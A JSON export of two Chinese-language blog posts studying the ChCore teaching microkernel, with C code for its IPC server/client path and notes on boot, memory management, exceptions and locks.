[{"title":"IPC","url":"/2024/09/17/chcore/IPC/","content":"<h1 id=\"IPC\"><a href=\"#IPC\" class=\"headerlink\" title=\"IPC\"></a>IPC</h1><h2 id=\"code\"><a href=\"#code\" class=\"headerlink\" title=\"code\"></a>code</h2><h3 id=\"server\"><a href=\"#server\" class=\"headerlink\" title=\"server\"></a>server</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> cap;</span><br><span class=\"line\"></span><br><span class=\"line\">        cap = chcore_thread_create(routine, <span class=\"number\">0</span>, <span class=\"number\">0</span>, TYPE_USER);</span><br><span class=\"line\">        chcore_bug_on(cap &lt; <span class=\"number\">0</span>);</span><br><span class=\"line\">        __chcore_set_procm_cap(cap);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> *<span class=\"title function_\">routine</span><span class=\"params\">(<span class=\"type\">void</span> *arg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret, cap;</span><br><span class=\"line\"></span><br><span class=\"line\">        spawn(<span class=\"string\">&quot;/user.bin&quot;</span>, &amp;cap); <span class=\"comment\">/* Test spawn function */</span></span><br><span class=\"line\">        ipc_register_server(lab4_test_ipc_dispatch);</span><br><span class=\"line\">        spawn(<span class=\"string\">&quot;/ipc_client.bin&quot;</span>, &amp;cap); <span class=\"comment\">/* Test IPC */</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">ipc_register_server</span><span class=\"params\">(server_handler server_handler)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_vm_config</span> <span class=\"title\">vm_config</span>;</span></span><br><span class=\"line\">        vm_config.buf_base_addr = SERVER_BUF_BASE;</span><br><span class=\"line\">        vm_config.buf_size = SERVER_BUF_SIZE;</span><br><span class=\"line\">        vm_config.stack_base_addr = SERVER_STACK_BASE;</span><br><span class=\"line\">        vm_config.stack_size = SERVER_STACK_SIZE;</span><br><span class=\"line\">        ret = __chcore_sys_register_server(</span><br><span class=\"line\">                (u64)server_handler, MAX_CLIENT, (u64)&amp;vm_config);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 <span class=\"title function_\">sys_register_server</span><span class=\"params\">(u64 callback, u64 max_client, u64 vm_config_ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">thread</span> *<span class=\"title\">server</span> =</span> current_thread;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">server_ipc_config</span> *<span class=\"title\">server_ipc_config</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_vm_config</span> *<span class=\"title\">vm_config</span>;</span></span><br><span class=\"line\">        <span class=\"type\">int</span> r;</span><br><span class=\"line\">        server_ipc_config = kmalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> server_ipc_config));</span><br><span class=\"line\">        server_ipc_config-&gt;callback = callback;</span><br><span class=\"line\">        server_ipc_config-&gt;max_client = max_client;</span><br><span class=\"line\">        server_ipc_config-&gt;conn_bmp =</span><br><span class=\"line\">                kzalloc(BITS_TO_LONGS(max_client) * <span class=\"keyword\">sizeof</span>(<span class=\"type\">long</span>));</span><br><span class=\"line\">        vm_config = &amp;server_ipc_config-&gt;vm_config;</span><br><span class=\"line\">        r = copy_from_user(</span><br><span class=\"line\">                (<span class=\"type\">char</span> *)vm_config, (<span class=\"type\">char</span> *)vm_config_ptr, <span class=\"keyword\">sizeof</span>(*vm_config));</span><br><span class=\"line\">        server-&gt;general_ipc_config = server_ipc_config;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">lab4_test_ipc_dispatch</span><span class=\"params\">(<span class=\"keyword\">struct</span> ipc_msg *ipc_msg, u64 client_pid)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret_cap, write_val;</span><br><span class=\"line\">        <span class=\"type\">bool</span> ret_with_cap = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> len = ipc_msg-&gt;data_len;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> ((i * <span class=\"number\">4</span>) &lt; len) &#123;</span><br><span class=\"line\">            ret += ((<span class=\"type\">int</span> *)ipc_get_msg_data(ipc_msg))[i];</span><br><span class=\"line\">            i++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret_with_cap)</span><br><span class=\"line\">                ipc_return_with_cap(ipc_msg, ret);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">                ipc_return(ipc_msg, ret);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">sys_ipc_return</span><span class=\"params\">(u64 ret, u64 cap_num)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_connection</span> *<span class=\"title\">conn</span> =</span> current_thread-&gt;active_conn;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cap_num != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                ipc_send_cap_to_client(conn, cap_num);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        conn-&gt;source-&gt;thread_ctx-&gt;state = TS_RUNNING;</span><br><span class=\"line\">        conn-&gt;source-&gt;thread_ctx-&gt;sc = current_thread-&gt;thread_ctx-&gt;sc;</span><br><span class=\"line\">        thread_migrate_to_client(conn, ret);</span><br><span class=\"line\">     \tBUG(<span class=\"string\">&quot;This function should never\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">thread_migrate_to_client</span><span class=\"params\">(<span class=\"keyword\">struct</span> ipc_connection *conn, u64 ret_value)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">thread</span> *<span class=\"title\">source</span> =</span> conn-&gt;source;</span><br><span class=\"line\">        current_thread-&gt;active_conn = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        arch_set_thread_return(source, ret_value);</span><br><span class=\"line\">        switch_to_thread(source);</span><br><span class=\"line\">        eret_to_thread(switch_context());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"client\"><a href=\"#client\" class=\"headerlink\" title=\"client\"></a>client</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[], <span class=\"type\">char</span> *envp[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        test_ipc_routine(__chcore_get_procm_cap());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">test_ipc_routine</span><span class=\"params\">(<span class=\"type\">int</span> server_cap)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_struct</span> *<span class=\"title\">client_ipc_struct</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_msg</span> *<span class=\"title\">ipc_msg</span>;</span></span><br><span class=\"line\">        <span class=\"type\">int</span> shared_page_pmo_cap, shared_msg;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret, i;</span><br><span class=\"line\">        client_ipc_struct = ipc_register_client(server_cap);</span><br><span class=\"line\"></span><br><span class=\"line\">       ipc_msg = ipc_create_msg(client_ipc_struct, <span class=\"number\">4</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; IPC_TEST_NUM; i++) &#123;</span><br><span class=\"line\">                ipc_set_msg_data(ipc_msg, (<span class=\"type\">char</span> *)&amp;i, <span class=\"number\">0</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">                ret = ipc_call(client_ipc_struct, ipc_msg);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> ipc_struct *<span class=\"title function_\">ipc_register_client</span><span class=\"params\">(<span class=\"type\">int</span> server_thread_cap)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> conn_cap, retry_times = RETRY_UPPER_BOUND;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_struct</span> *<span class=\"title\">ipc_struct</span> =</span> <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> ipc_struct));</span><br><span class=\"line\">        <span class=\"type\">int</span> client_id = __sync_fetch_and_add(&amp;client_ipc_num, <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_vm_config</span> <span class=\"title\">vm_config</span>;</span></span><br><span class=\"line\">        vm_config.buf_base_addr = CLIENT_BUF_BASE + client_id * CLIENT_BUF_SIZE;</span><br><span class=\"line\">        vm_config.buf_size = CLIENT_BUF_SIZE;</span><br><span class=\"line\">        conn_cap = __chcore_sys_register_client((u32)server_thread_cap,(u64)&amp;vm_config);</span><br><span class=\"line\">        ipc_struct-&gt;shared_buf = vm_config.buf_base_addr;</span><br><span class=\"line\">        ipc_struct-&gt;shared_buf_len = vm_config.buf_size;</span><br><span class=\"line\">        ipc_struct-&gt;conn_cap = conn_cap;</span><br><span class=\"line\">        spinlock_init(&amp;ipc_struct-&gt;ipc_lock);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ipc_struct;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u32 <span class=\"title function_\">sys_register_client</span><span class=\"params\">(u32 server_cap, u64 vm_config_ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">thread</span> *<span class=\"title\">client</span> =</span> current_thread;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">thread</span> *<span class=\"title\">server</span> =</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_connection</span> *<span class=\"title\">conn</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_vm_config</span> <span class=\"title\">vm_config</span> =</span> &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">        u64 client_buf_size;</span><br><span class=\"line\">        <span class=\"type\">int</span> conn_cap = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> r = <span class=\"number\">0</span>;</span><br><span class=\"line\">        r = copy_from_user(</span><br><span class=\"line\">                (<span class=\"type\">char</span> *)&amp;vm_config, (<span class=\"type\">char</span> *)vm_config_ptr, <span class=\"keyword\">sizeof</span>(vm_config));</span><br><span class=\"line\">        server = obj_get(current_cap_group, server_cap, TYPE_THREAD);</span><br><span class=\"line\">        client_buf_size = vm_config.buf_size;</span><br><span class=\"line\">        conn_cap = create_connection(client, server, &amp;vm_config);</span><br><span class=\"line\">        conn = obj_get(current_cap_group, conn_cap, TYPE_CONNECTION);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (client_buf_size != vm_config.buf_size) &#123;</span><br><span class=\"line\">                r = copy_to_user((<span class=\"type\">char</span> *)vm_config_ptr,</span><br><span class=\"line\">                                 (<span class=\"type\">char</span> *)&amp;vm_config,</span><br><span class=\"line\">                                 <span class=\"keyword\">sizeof</span>(vm_config));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        r = conn_cap;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">create_connection</span><span class=\"params\">(<span class=\"keyword\">struct</span> thread *source, <span class=\"keyword\">struct</span> thread *target,</span></span><br><span class=\"line\"><span class=\"params\">                             <span class=\"keyword\">struct</span> ipc_vm_config *client_vm_config)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_connection</span> *<span class=\"title\">conn</span> =</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> conn_cap = <span class=\"number\">0</span>, server_conn_cap = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pmobject</span> *<span class=\"title\">stack_pmo</span>, *<span class=\"title\">buf_pmo</span>;</span></span><br><span class=\"line\">        <span class=\"type\">int</span> conn_idx;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">server_ipc_config</span> *<span class=\"title\">server_ipc_config</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_vm_config</span> *<span class=\"title\">vm_config</span>;</span></span><br><span class=\"line\">        u64 server_stack_base, server_buf_base, client_buf_base;</span><br><span class=\"line\">        u64 stack_size, buf_size;</span><br><span class=\"line\">        conn = obj_alloc(TYPE_CONNECTION, <span class=\"keyword\">sizeof</span>(*conn));</span><br><span class=\"line\">        conn-&gt;target = create_server_thread(target);</span><br><span class=\"line\">        server_ipc_config = target-&gt;general_ipc_config;</span><br><span class=\"line\">        vm_config = &amp;server_ipc_config-&gt;vm_config;</span><br><span class=\"line\">        conn_idx = find_next_zero_bit(</span><br><span class=\"line\">                server_ipc_config-&gt;conn_bmp, server_ipc_config-&gt;max_client, <span class=\"number\">0</span>);</span><br><span class=\"line\">        set_bit(conn_idx, server_ipc_config-&gt;conn_bmp);</span><br><span class=\"line\">        server_stack_base = vm_config-&gt;stack_base_addr + conn_idx * vm_config-&gt;stack_size;</span><br><span class=\"line\"></span><br><span class=\"line\">        stack_size = vm_config-&gt;stack_size;</span><br><span class=\"line\">        stack_pmo = kmalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> pmobject));</span><br><span class=\"line\">        pmo_init(stack_pmo, PMO_DATA, stack_size, <span class=\"number\">0</span>);</span><br><span class=\"line\">        vmspace_map_range(target-&gt;vmspace,</span><br><span class=\"line\">                          server_stack_base,</span><br><span class=\"line\">                          stack_size,</span><br><span class=\"line\">                          VMR_READ | VMR_WRITE,</span><br><span class=\"line\">                          stack_pmo);</span><br><span class=\"line\">        conn-&gt;server_stack_top = server_stack_base + stack_size;</span><br><span class=\"line\">        server_buf_base = vm_config-&gt;buf_base_addr + conn_idx * vm_config-&gt;buf_size;</span><br><span class=\"line\">        client_buf_base = client_vm_config-&gt;buf_base_addr;</span><br><span class=\"line\">        buf_size = MIN(vm_config-&gt;buf_size, client_vm_config-&gt;buf_size);</span><br><span class=\"line\">        client_vm_config-&gt;buf_size = buf_size;</span><br><span class=\"line\">        buf_pmo = kmalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> pmobject));</span><br><span class=\"line\">        pmo_init(buf_pmo, PMO_DATA, buf_size, <span class=\"number\">0</span>);</span><br><span class=\"line\">        vmspace_map_range(current_thread-&gt;vmspace, client_buf_base, buf_size, VMR_READ | VMR_WRITE, buf_pmo);</span><br><span class=\"line\">        vmspace_map_range(target-&gt;vmspace, server_buf_base, buf_size, VMR_READ | VMR_WRITE, buf_pmo);</span><br><span class=\"line\">        conn-&gt;buf.client_user_addr = client_buf_base;</span><br><span class=\"line\">        conn-&gt;buf.server_user_addr = server_buf_base;</span><br><span class=\"line\">        conn_cap = cap_alloc(current_cap_group, conn, <span class=\"number\">0</span>);</span><br><span class=\"line\">        server_conn_cap =</span><br><span class=\"line\">                cap_copy(current_cap_group, target-&gt;cap_group, conn_cap);</span><br><span class=\"line\">        conn-&gt;server_conn_cap = server_conn_cap;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> conn_cap;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> thread *<span class=\"title function_\">create_server_thread</span><span class=\"params\">(<span class=\"keyword\">struct</span> thread *src)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">thread</span> *<span class=\"title\">new</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">server_ipc_config</span> *<span class=\"title\">new_config</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">server_ipc_config</span> *<span class=\"title\">src_config</span>;</span></span><br><span class=\"line\">        new = kmalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> thread));</span><br><span class=\"line\">        new-&gt;vmspace = obj_get(src-&gt;cap_group, VMSPACE_OBJ_ID, TYPE_VMSPACE);</span><br><span class=\"line\">        new-&gt;thread_ctx = create_thread_ctx(TYPE_SHADOW);</span><br><span class=\"line\">        <span class=\"built_in\">memcpy</span>((<span class=\"type\">char</span> *)&amp;(new-&gt;thread_ctx-&gt;ec),</span><br><span class=\"line\">               (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;(src-&gt;thread_ctx-&gt;ec),</span><br><span class=\"line\">               <span class=\"keyword\">sizeof</span>(<span class=\"type\">arch_exec_cont_t</span>));</span><br><span class=\"line\">        new-&gt;thread_ctx-&gt;prio = MAX_PRIO - <span class=\"number\">1</span>;</span><br><span class=\"line\">        new-&gt;thread_ctx-&gt;state = TS_INIT;</span><br><span class=\"line\">        new-&gt;thread_ctx-&gt;affinity = NO_AFF;</span><br><span class=\"line\">        new-&gt;thread_ctx-&gt;type = TYPE_SHADOW;</span><br><span class=\"line\">        src_config = (<span class=\"keyword\">struct</span> server_ipc_config *)src-&gt;general_ipc_config;</span><br><span class=\"line\">        new_config = kzalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> server_ipc_config));</span><br><span class=\"line\">        new_config-&gt;callback = src_config-&gt;callback;</span><br><span class=\"line\">        new_config-&gt;vm_config = src_config-&gt;vm_config;</span><br><span class=\"line\">        new-&gt;general_ipc_config = new_config;</span><br><span class=\"line\">        new-&gt;cap_group = src-&gt;cap_group;</span><br><span class=\"line\">        obj_put(new-&gt;vmspace);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> new;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 <span class=\"title function_\">sys_ipc_call</span><span class=\"params\">(u32 conn_cap, <span class=\"keyword\">struct</span> ipc_msg *ipc_msg, u64 cap_num)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_connection</span> *<span class=\"title\">conn</span> =</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        u64 arg;</span><br><span class=\"line\">        <span class=\"type\">int</span> r = <span class=\"number\">0</span>;</span><br><span class=\"line\">        conn = obj_get(current_thread-&gt;cap_group, conn_cap, TYPE_CONNECTION);</span><br><span class=\"line\">        conn-&gt;ipc_msg = ipc_msg;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cap_num &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                r = ipc_send_cap(conn);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        arg = conn-&gt;buf.server_user_addr;</span><br><span class=\"line\">        thread_migrate_to_server(conn, arg);</span><br><span class=\"line\">   \t\tBUG(<span class=\"string\">&quot;This function should never\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> u64 <span class=\"title function_\">thread_migrate_to_server</span><span class=\"params\">(<span class=\"keyword\">struct</span> ipc_connection *conn, u64 arg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">thread</span> *<span class=\"title\">target</span> =</span> conn-&gt;target;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">server_ipc_config</span> *<span class=\"title\">target_ipc_config</span> =</span></span><br><span class=\"line\">                (<span class=\"keyword\">struct</span> server_ipc_config *)(target-&gt;general_ipc_config);</span><br><span class=\"line\">        u64 callback = target_ipc_config-&gt;callback;</span><br><span class=\"line\">        conn-&gt;source = current_thread;</span><br><span class=\"line\">        current_thread-&gt;thread_ctx-&gt;state = TS_WAITING;</span><br><span class=\"line\">        target-&gt;active_conn = conn;</span><br><span class=\"line\">        obj_put(conn);</span><br><span class=\"line\">        arch_set_thread_stack(target, conn-&gt;server_stack_top);</span><br><span class=\"line\">        arch_set_thread_next_ip(target, callback);</span><br><span class=\"line\">        arch_set_thread_arg0(target, arg);</span><br><span class=\"line\">        arch_set_thread_arg1(target, current_thread-&gt;cap_group-&gt;pid);</span><br><span class=\"line\">        target-&gt;thread_ctx-&gt;sc = current_thread-&gt;thread_ctx-&gt;sc;</span><br><span class=\"line\">        switch_to_thread(target);</span><br><span class=\"line\">        eret_to_thread(switch_context());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"执行流\"><a href=\"#执行流\" class=\"headerlink\" title=\"执行流\"></a>执行流</h2><p>client先register_client，需要知道想要通信的服务端进程。</p>\n<p>创建连接会为服务端进程再创建一个线程，设置相同的vmspace (每个client都会在服务器进程创建一个线程作为单独的连接对象)</p>\n<p>client ipc_call时，不用sched，而是直接switch到target，将自己设置为waiting，不加入等待队列。需要设置参数和target为服务端的处理函数。</p>\n<p>server ipc_return时，设置client为running后直接switch到client，设置返回值</p>\n<p>由于ipc的操作都是进内核的，eret会直接返回到用户态，因此server返回到client时，执行ipc_call的下一条指令，切换到server的调用链直接被中止。由于ret addr不使用栈，因此也不会对内核栈产生很大的破坏。</p>\n<h2 id=\"共享内存\"><a href=\"#共享内存\" class=\"headerlink\" title=\"共享内存\"></a>共享内存</h2><p>每个connection会创建pmo，同时映射到client和server的地址空间</p>\n<p>client和server的thread是一对一的，但是即使是不同的thread也是服务在同一个写死的地址上，所以需要根据不同情况算偏移找不同的位置。</p>\n<ul>\n<li>server: 同一个dispatch会需要支持不同client访问，每次create_connection时会得到不同的连接，server对于IPC提供的缓冲区根据不同connection id找到偏移 服务不同客户</li>\n<li>client：同一个cilent会需要和不同的server通信，每次register client会拿到不同client id，client对于IPC提供的缓冲区根据不同的client id找到偏移，请求不同的服务</li>\n</ul>\n<p>每个client创建pmo，然后映射到服务端的地址都不会重复。buf和stack各需要一个pmo</p>\n<ul>\n<li><p><code>buf_addr</code>为A-stack client server共享内存 传递参数</p>\n</li>\n<li><p><code>stack_addr</code>为E-stack server thread执行用</p>\n</li>\n</ul>\n<h2 id=\"消息传递\"><a href=\"#消息传递\" class=\"headerlink\" title=\"消息传递\"></a>消息传递</h2><p>client通过<code>ipc_create_msg</code> 会把消息直接写入到共享内存的开头，在迁移线程时设置地址为服务端共享内存地址即可（两端虚拟地址不一样，但物理地址一样）</p>\n<p>共享内存首地址即为msg对象(元数据)，而紧接着msg对象的就是msg所带data </p>\n<p>可以自己为每种不同的IPC定义request结构体，然后直接进行类型转换</p>\n<p>以文件系统为例，共享内存布局如下</p>\n<p>msg元数据—fs_request元数据—文件数据</p>\n<h2 id=\"cap\"><a href=\"#cap\" class=\"headerlink\" title=\"cap\"></a>cap</h2><p>需要传递资源给server</p>\n<p>很多IPC的操作是被写在kernel里的，kernel的地址空间是共用的，因此即使是不同进程本地修改cap，在context switch到另一个进程时，修改仍有效</p>\n","categories":["chcore"]},{"title":"chcore","url":"/2024/09/17/chcore/chcore/","content":"<h1 id=\"chcore\"><a href=\"#chcore\" class=\"headerlink\" title=\"chcore\"></a>chcore</h1><h2 id=\"初始化\"><a href=\"#初始化\" class=\"headerlink\" title=\"初始化\"></a>初始化</h2><ol>\n<li><p>start.S </p>\n<p><code>mpidr</code>拿到cpu核编号，其他核等待 主核设置<code>scr</code> <code>elr</code>(返回地址) <code>spsr</code>(异常状态) 切换到el1</p>\n<p>设置栈地址</p>\n</li>\n<li><p>init_c</p>\n<p>清理bss</p>\n<p>初始化uart</p>\n<p>初始化页表</p>\n<p>激活mmu</p>\n</li>\n<li><p>start_kernel</p>\n<p>重新设置栈(高地址)</p>\n<p>关掉对低地址(<code>ttbr0</code>)的翻译 flush tlb</p>\n</li>\n<li><p>main</p>\n<p>初始化锁</p>\n<p>初始化物理内存分配系统</p>\n<p><code>set_exception_vector</code> 初始化异常向量表 打开中断</p>\n<p>初始化调度策略（链表，idle线程）</p>\n<p>激活其他线程</p>\n<p>拿锁 根据指定配置创建root线程 这里<code>create_root_thread</code>会先创建root进程再创建线程</p>\n<p>调度 切换上下文 返回用户态</p>\n</li>\n</ol>\n<h2 id=\"进程与线程\"><a href=\"#进程与线程\" class=\"headerlink\" title=\"进程与线程\"></a>进程与线程</h2><p><code>cap_group</code>是进程的抽象，元数据包括其拥有的所有的内核对象，例如vmspace，Capability是访问某个内核对象的令牌</p>\n<p>进程只是获取资源和原理资源的对象，单独创建没有意义，需要填入创建线程需要的参数中然后创建线程。</p>\n<p>创建线程并加载用户文件有两个函数：</p>\n<ul>\n<li><p><code>load_binary</code> 解析elf 创建pmo，建立映射，复制数据，拿到pc并返回用于创建线程，在内核态创建root的线程的时候使用</p>\n</li>\n<li><p><code>launch_process</code>解析elf 通过系统调用创建pmo并映射 <code>spawn</code>之前的<code>parse_elf_from_binary</code>已经为每个段都拿到了pmo并复制，<code>launch_process</code>中只要为每个段建立映射即可</p>\n<p>libchore是额外提供的库，用户态程序，基本都是通过syscall和内核交互完成功能，提供<code>spawn</code>等函数</p>\n</li>\n</ul>\n<p>线程调度在内核态完成</p>\n<p>进程管理在用户态的procm server完成</p>\n<p>存在crt0的几个函数用汇编写入main外层的<code>_start</code>函数，并在main调用之后调用进程退出和线程退出函数</p>\n<p>猜测这个libchore的crt0函数会和用户程序一同编译</p>\n<h2 id=\"内存管理\"><a href=\"#内存管理\" class=\"headerlink\" title=\"内存管理\"></a>内存管理</h2><p><code>0xffff_0000_0000_0000 + addr</code> 映射到 <code>addr</code></p>\n<p>树莓派规定<code>0x00000000</code>~&#96;0x3f000000&#96; 物理地址会去主存访问，再大的物理地址会去对应的外设访问，与型号有关。</p>\n<p>buddy system虽然是管理物理内存的，但是所有的操作都是针对虚拟地址的。由于之前已经进行过大块映射。所以一整块连续内存对内核来说是可以直接给buddy system使用的，把对应地址转为page*即可</p>\n<p>页表会从buddy system拿到页地址，但是存储再页表项中的地址必须转换为物理地址。</p>\n<p>pmo作为一个资源对象，记录了物理内存资源。用radix tree做索引，key是虚拟内存的page编号，value是对应的物理内存地址。</p>\n<h2 id=\"异常\"><a href=\"#异常\" class=\"headerlink\" title=\"异常\"></a>异常</h2><ol>\n<li><p><code>exception_entry</code> 保存上下文到栈中 这里使用的栈已经是内核栈了</p>\n</li>\n<li><p>进入对应的处理entry，esr寄存器可判断异常原因，传入后续c函数</p>\n</li>\n<li><p>如果是syscall，跳转到syscall_table的entry</p>\n<p>如果是其他，例如page fault，进入handle_entry.c 根据esr判断并处理</p>\n<p>如果是时钟中断，<code>sched_handle_timer_irq</code>会做和调度相关的事情</p>\n</li>\n</ol>\n<h2 id=\"锁与信号量\"><a href=\"#锁与信号量\" class=\"headerlink\" title=\"锁与信号量\"></a>锁与信号量</h2><p>chcore中存在以下不同的实现</p>\n<ol>\n<li><p>通过硬件提供的特殊load和store指令实现fetch_and_add 随后再实现ticket lock，一把大锁，一进内核就拿</p>\n</li>\n<li><p>信号量记录当前线程等待的线程信息，通过加入和移除调度队列实现 。waitpid通过信号量的wait和signal实现</p>\n</li>\n<li><p>用二元信号量可在用户态实现互斥锁</p>\n</li>\n<li><p>gcc有内置的api <code>__sync_fetch_and_add</code> <code>__sync_lock_test_and_set</code>  